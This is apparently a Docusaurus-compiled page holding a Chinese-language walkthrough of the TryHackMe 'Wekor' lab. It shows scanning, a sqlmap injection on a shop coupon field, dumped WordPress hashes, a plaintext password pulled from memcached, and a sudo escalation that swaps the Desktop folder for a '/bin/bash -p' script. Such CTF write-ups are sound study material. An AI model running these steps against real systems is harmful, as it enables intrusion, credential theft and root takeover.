"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[2702],{87659:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>o,metadata:()=>i,toc:()=>c});var s=t(74848),r=t(28453);const o={sidebar_position:103,tags:["Easy","Linux","SQLI","SUDO"],title:"Wekor",description:"Wekor",sidebar_label:"Wekor",slug:"/tryhackme/103"},a="Wekor",i={id:"box/TryHackMe/103",title:"Wekor",description:"Wekor",source:"@site/docs/box/TryHackMe/103.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/103",permalink:"/docs/tryhackme/103",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SQLI",permalink:"/docs/tags/sqli"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:103,frontMatter:{sidebar_position:103,tags:["Easy","Linux","SQLI","SUDO"],title:"Wekor",description:"Wekor",sidebar_label:"Wekor",slug:"/tryhackme/103"},sidebar:"boxSidebar",previous:{title:"Mindgames",permalink:"/docs/tryhackme/102"},next:{title:"Empline",permalink:"/docs/tryhackme/104"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; Orka",id:"www-data--orka",level:3},{value:"Orka \u2014&gt; root",id:"orka--root",level:3}];function d(e){const n={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"wekor",children:"Wekor"}),"\n",(0,s.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-234-23:~/wekorra# nmap -sTCV -p 22,80 --min-rate 1000 10.10.57.118\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-19 03:52 BST\nNmap scan report for ip-10-10-57-118.eu-west-1.compute.internal (10.10.57.118)\nHost is up (0.00020s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)\n|   256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)\n|_  256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (EdDSA)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-robots.txt: 9 disallowed entries \n| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot \n|_/comingreallysoon /interesting\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\nMAC Address: 02:78:84:83:0D:09 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.26 seconds\n"})}),"\n",(0,s.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,s.jsx)(n.p,{children:"\u56e0\u4e3a\u9898\u76ee\u4e2d\u544a\u8bc9\u6211\u4e00\u4e2a\u57df\u540d\u6240\u4ee5\u6211\u76f4\u63a5\u5c31\u626b\u63cf\u4e86\u5b50\u57df"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-234-23:~/wekorra# gobuster vhost -u http://wekor.thm/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:          http://wekor.thm/\n[+] Threads:      10\n[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:   gobuster/3.0.1\n[+] Timeout:      10s\n===============================================================\n2023/09/19 03:53:13 Starting gobuster\n===============================================================\nFound: site.wekor.thm (Status: 200) [Size: 143]\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u8bbf\u95ee\u4e3b\u7ad9\u70b9, \u8fdb\u884c\u76ee\u5f55\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-234-23:~/wekorra# gobuster dir -u http://wekor.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://wekor.thm/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/09/19 03:55:22 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/robots.txt (Status: 200)\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u8bbf\u95ee robots.txt \u65f6\u544a\u8bc9\u6211\u4e00\u7cfb\u5217\u7684\u76ee\u5f55\u65f6, \u53d1\u73b0\u5176\u4e2d\u7ed9\u51fa\u4e86\u4e00\u4e9b\u65b0\u7684\u9875\u9762, \u5728\u8bbf\u95ee /comingreallysoon \u5176\u544a\u8bc9\u6211\u4e00\u4e2a\u65b0\u7684\u9875\u9762 /it-next, \u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u7535\u5546\u9875\u9762, \u6309\u7167\u5e38\u7406\u7535\u5546\u9875\u9762\u5f80\u5f80\u5e26\u6709 SQli \u6f0f\u6d1e, \u5728\u6b64\u7ecf\u8fc7\u641c\u7d22\u53d1\u73b0\u4e86\u53ef\u4ee5\u5229\u7528\u7684\u65b9\u6cd5"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-131216.png",alt:"Untitled"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'$ sqlmap -u http://wekor.thm/it-next/it_cart.php --data="coupon_code=&apply_coupon=Apply%20Coupon" --dbs\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5229\u7528\u6b64\u6211\u83b7\u53d6\u5230\u4e86\u6570\u636e\u5e93\u5185\u5bb9, \u5728\u5176\u4e2d\u6211\u53d1\u73b0\u4e86 wordpress \u6570\u636e\u5e93, \u5e76\u4ece\u5176\u4e2d\u83b7\u53d6\u5230\u4e86\u7528\u6237, \u540c\u65f6\u5bc6\u7801\u662f\u52a0\u5bc6\u7684\u5185\u5bb9"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"+------+---------------------------------+------------------------------------+------------+-------------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+\n| ID   | user_url                        | user_pass                          | user_login | user_email        | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |\n+------+---------------------------------+------------------------------------+------------+-------------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+\n| 1    | http://site.wekor.thm/wordpress | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. | admin      | admin@wekor.thm   | 0           | admin        | admin         | 2021-01-21 20:33:37 | <blank>                                       |\n| 5743 | http://jeffrey.com              | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 | wp_jeffrey | jeffrey@wekor.thm | 0           | wp jeffrey   | wp_jeffrey    | 2021-01-21 20:34:50 | 1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0 |\n| 5773 | http://yura.com                 | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ | wp_yura    | yura@wekor.thm    | 0           | wp yura      | wp_yura       | 2021-01-21 20:35:27 | <blank>                                       |\n| 5873 | http://eagle.com                | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ | wp_eagle   | eagle@wekor.thm   | 0           | wp eagle     | wp_eagle      | 2021-01-21 20:36:11 | <blank>                                       |\n+------+---------------------------------+------------------------------------+------------+-------\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-131205.png",alt:"Untitled"})}),"\n",(0,s.jsx)(n.p,{children:"\u8bbf\u95ee\u65b0\u7684\u7ad9\u70b9, \u8fd9\u91cc\u5e94\u8be5\u662f\u5b58\u5728 wordpress \u9875\u9762, \u7ee7\u7eed\u8fdb\u884c\u76ee\u5f55\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-234-23:~/wekorra# gobuster dir -u http://site.wekor.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://site.wekor.thm/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/09/19 03:58:05 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/wordpress (Status: 301)\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5229\u7528\u4e0a\u9762\u5f97\u5230\u7684\u7528\u6237\u767b\u9646 wordpress \u540e\u53f0\u5e76\u4e0a\u4f20 reverse shell"}),"\n",(0,s.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,s.jsx)(n.p,{children:"\u8bbf\u95ee\u6211\u4eec\u4e0a\u4f20\u7684 Shell, \u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2aShell"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-131205-1.png",alt:"Untitled"})}),"\n",(0,s.jsx)(n.h3,{id:"www-data--orka",children:"www-data \u2014> Orka"}),"\n",(0,s.jsx)(n.p,{children:"\u67e5\u770b\u672c\u5730\u7aef\u53e3\u60c5\u51b5\u53d1\u73b0\u4e00\u4e9b\u989d\u5916\u7684\u7aef\u53e3"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@osboxes:/tmp$ netstat -tuln\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State      \ntcp        0      0 127.0.0.1:3010          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN     \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     \ntcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u67e5\u770b\u8fdb\u7a0b\u4fe1\u606f\u6211\u53d1\u73b0\u5176\u4e2d\u5b58\u5728\u4e00\u4e2a\u8bb0\u5f55"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"memcache   969     1  0 22:50 ?        00:00:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1\n"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:["Memcached",(0,s.jsx)(n.strong,{children:"\u662f\u4e00\u6b3e\u5f00\u6e90\u3001\u9ad8\u6027\u80fd\u3001\u5206\u5e03\u5f0f\u5185\u5b58\u5bf9\u8c61\u7f13\u5b58\u7cfb\u7edf"}),"\uff0c\u53ef\u5e94\u7528\u5404\u79cd\u9700\u8981\u7f13\u5b58\u7684\u573a\u666f\uff0c\u5176\u4e3b\u8981\u76ee\u7684\u662f\u901a\u8fc7\u964d\u4f4e\u5bf9Database\u7684\u8bbf\u95ee\u6765\u52a0\u901fweb\u5e94\u7528\u7a0b\u5e8f\u3002 \u5b83\u662f\u4e00\u4e2a\u57fa\u4e8e\u5185\u5b58\u7684\u201c\u952e\u503c\u5bf9\u201d\u5b58\u50a8\uff0c\u7528\u4e8e\u5b58\u50a8\u6570\u636e\u5e93\u8c03\u7528\u3001API\u8c03\u7528\u6216\u9875\u9762\u5f15\u7528\u7ed3\u679c\u7684\u76f4\u63a5\u6570\u636e\uff0c\u5982\u5b57\u7b26\u4e32\u3001\u5bf9\u8c61\u7b49"]}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@osboxes:/usr/share/memcached/scripts$ ./memcached-tool localhost:11211 dump\nDumping memcache contents\n  Number of buckets: 1\n  Number of items  : 5\nDumping bucket 1 - 5 total items\nadd username 0 1695091742 4\nOrka\nadd salary 0 1695091742 8\n$100,000\nadd password 0 1695091742 15\nOrkAiSC00L24/7$\nadd email 0 1695091742 14\nOrka@wekor.thm\nadd id 0 1695091742 4\n3476\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u83b7\u53d6\u5230\u7528\u6237 Orka \u7684\u5bc6\u7801, \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6b64\u8fdb\u884c\u767b\u9646"}),"\n",(0,s.jsx)(n.h3,{id:"orka--root",children:"Orka \u2014> root"}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u53d1\u73b0 Orka \u7528\u6237\u5177\u6709 SUDO \u7279\u6743"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"Orka@osboxes:/usr/share/memcached/scripts$ sudo -l\n[sudo] password for Orka: \nMatching Defaults entries for Orka on osboxes:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser Orka may run the following commands on osboxes:\n    (root) /home/Orka/Desktop/bitcoin\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u5c06\u5176\u4e0b\u8f7d\u4e0b\u6765\u67e5\u770b\u5176\u5185\u90e8\u5b57\u7b26\u4e32"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:".....\nEnter the password : \npassword\nAccess Denied... \nAccess Granted...\n\t\t\tUser Manual:\t\t\t\nMaximum Amount Of BitCoins Possible To Transfer at a time : 9 \nAmounts with more than one number will be stripped off! \nAnd Lastly, be careful, everything is logged :) \nAmount Of BitCoins : \n Sorry, This is not a valid amount! \npython /home/Orka/Desktop/transfer.py %c\n.....\n"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u5176\u9700\u8981\u5bc6\u7801\u4f30\u8ba1\u662f password"}),"\n",(0,s.jsx)(n.li,{children:"\u5f53\u64cd\u4f5c\u5b8c\u6210\u540e\u4f1a\u6267\u884c /home/Orka/Desktop/transfer.py"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u7ed3\u5408\u4e0a\u9762\u7684\u4fe1\u606f, \u6211\u60f3\u7684\u662f:"}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:"\u8986\u76d6\u539f\u672c\u7684\u7a0b\u5e8f , \u4f46\u662f\u6ca1\u6709\u6743\u9650"}),"\n",(0,s.jsx)(n.li,{children:"\u57fa\u4e8e Python PATH \u7684\u653b\u51fb, \u4f46\u662f\u5bf9\u4e8e\u5f53\u524d\u76ee\u5f55\u6ca1\u6709\u6743\u9650\u64cd\u4f5c"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u56e0\u4e3a\u6211\u5bf9 /home/Orka/Desktop/* \u6ca1\u6709\u6743\u9650\u64cd\u4f5c, \u4e8e\u662f\u6211\u5c31\u5bf9 Desktop \u6587\u4ef6\u5939\u8fdb\u884c\u4e86\u64cd\u4f5c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"(remote) Orka@osboxes:/home/Orka$ mv Desktop original\n(remote) Orka@osboxes:/home/Orka$ mkdir Desktop\n(remote) Orka@osboxes:/home/Orka$ cd Desktop/\n(remote) Orka@osboxes:/home/Orka/Desktop$ ls\n(remote) Orka@osboxes:/home/Orka/Desktop$ cat << EOF > bitcoin\n> /bin/bash -p\n> EOF\n(remote) Orka@osboxes:/home/Orka/Desktop$ chmod +x bitcoin \n(remote) Orka@osboxes:/home/Orka/Desktop$ sudo -u root /home/Orka/Desktop/bitcoin\nroot@osboxes:~/Desktop# id\nuid=0(root) gid=0(root) groups=0(root)\n"})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>i});var s=t(96540);const r={},o=s.createContext(r);function a(e){const n=s.useContext(o);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),s.createElement(o.Provider,{value:n},e.children)}}}]);